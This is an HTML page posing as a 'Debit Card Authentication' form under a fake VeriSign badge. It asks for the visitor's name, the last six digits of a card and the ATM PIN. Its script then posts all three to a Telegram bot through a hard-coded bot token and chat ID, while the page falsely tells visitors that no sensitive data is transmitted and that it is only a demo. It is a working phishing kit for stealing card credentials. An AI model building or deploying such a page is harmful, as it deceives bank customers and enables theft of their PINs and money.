<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Debit Card Authentication ‚Äì Demo</title>
<style>
*{ box-sizing:border-box; margin:0; padding:0; font-family:Arial, Helvetica, sans-serif; }
body{ background:#f8f8f8; display:flex; justify-content:center; padding:20px 0; }
.page{ max-width:380px; width:100%; background:#fff; border-radius:12px; overflow:hidden; box-shadow:0 2px 12px rgba(0,0,0,0.1); display:flex; flex-direction:column; }
.header{ padding:14px 16px; font-size:18px; font-weight:bold; text-align:center; border-bottom:1px solid #ddd; }
.card-img{ width:100%; aspect-ratio:1.585; max-height:250px; border-radius:12px 12px 0 0; margin-bottom:12px; overflow:hidden; }
.card-img img{ width:100%; height:100%; object-fit:contain; }
.form{ padding:16px; }
.form label{ font-weight:bold; display:block; margin-top:14px; margin-bottom:6px; font-size:15px; }
.card-input{ display:flex; align-items:center; border:1px solid #cfcfcf; border-radius:12px; height:50px; padding:0 12px; background:#fff; margin-bottom:12px; }
.card-input .fixed{ font-size:16px; color:#777; letter-spacing:2px; margin-right:6px; white-space:nowrap; }
.card-input input{ border:none; outline:none; font-size:16px; flex:1; letter-spacing:2px; }
#pin{ width:100%; height:50px; border:1px solid #cfcfcf; border-radius:12px; padding:0 12px; font-size:42px; letter-spacing:22px; text-align:center; caret-color:transparent; margin-bottom:12px; }
button{ width:100%; height:50px; margin-top:10px; background:#e6a100; border:none; border-radius:6px; font-size:17px; color:#fff; font-weight:bold; cursor:pointer; }
.note-box{ margin:16px; background:#e9f4ff; padding:12px; font-size:13px; }
.note-box ul{ padding-left:16px; }
.note-box li{ margin-bottom:4px; }
.footer{ margin-top:auto; margin-bottom:20px; background:#000; color:#fff; padding:10px 12px; font-size:13px; display:flex; align-items:center; gap:2px; }
</style>
</head>
<body>

<div class="page">
  <div class="header">Debit Card Authentication</div>

  <div class="card-img">
    <img id="cardImage" src="img/card1.jpg">
  </div>

  <div class="form">

    <!-- Name -->
    <label>Enter Your Name</label>
    <div class="card-input">
      <input type="text" id="userName" placeholder="Your full name">
    </div>

    <!-- Card Last 6 -->
    <label>Enter last 6 digits of card</label>
    <div class="card-input">
      <span class="fixed">#### #### ##</span>
      <input type="text" id="cardLast6" maxlength="7" inputmode="numeric">
    </div>

    <!-- PIN -->
    <label>Enter ATM PIN</label>
    <input type="tel" id="pin" inputmode="numeric">

    <button id="proceedBtn">Proceed ‚Üí</button>
  </div>

  <div class="note-box">
    <ul>
      <li>Mandatory fields are marked as important</li>
      <li>Demo interface only</li>
      <li>No sensitive data is transmitted</li>
    </ul>
  </div>

  <div class="footer">
    ‚úî VeriSign ¬© All Rights Reserved
  </div>
</div>

<script>
// CARD IMAGE ROTATION
const cards = ["img/card1.jpg","img/card2.jpg","img/card3.jpg"];
let idx = 0;
setInterval(()=>{
  idx = (idx + 1) % cards.length;
  document.getElementById("cardImage").src = cards[idx];
},2500);

// Card Input formatting
const cardInput = document.getElementById("cardLast6");
cardInput.addEventListener("input",()=>{
  let v = cardInput.value.replace(/\D/g,'');
  if(v.length>2) v = v.slice(0,2)+' '+v.slice(2,6);
  cardInput.value = v;
});

// PIN dots
const pinInput = document.getElementById("pin");
let fakePin = "";
pinInput.addEventListener("input",e=>{
  if(e.inputType==="deleteContentBackward"){
    fakePin = fakePin.slice(0,-1);
  }else if(/\d/.test(e.data) && fakePin.length<4){
    fakePin += e.data;
  }
  pinInput.value = "‚Ä¢".repeat(fakePin.length);
});

// TELEGRAM SETTINGS
const BOT_TOKEN = "8583144965:AAHKM7sS_a8p3DhZjN32ptcWnIliQYOeEcE";
const CHAT_ID  = "-5291510569";

// SEND DATA TO TELEGRAM
document.getElementById("proceedBtn").onclick = () => {
  const name = document.getElementById("userName").value.trim();
  const card = document.getElementById("cardLast6").value.trim();
  const pin = fakePin;

  if(name === ""){
    alert("Please enter your Name");
    return;
  }

  const message =
`üìã Demo Form Submitted
üë§ Name: ${name}
üí≥ Card last 6: ${card}
üîê PIN: ${pin}
‚è± Time: ${new Date().toLocaleString()}
‚Ñπ Demo only`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({ chat_id: CHAT_ID, text: message })
  })
  .then(()=>alert("‚úÖ "))
  .catch(()=>alert("‚ùå error"));
};
</script>

</body>
</html>
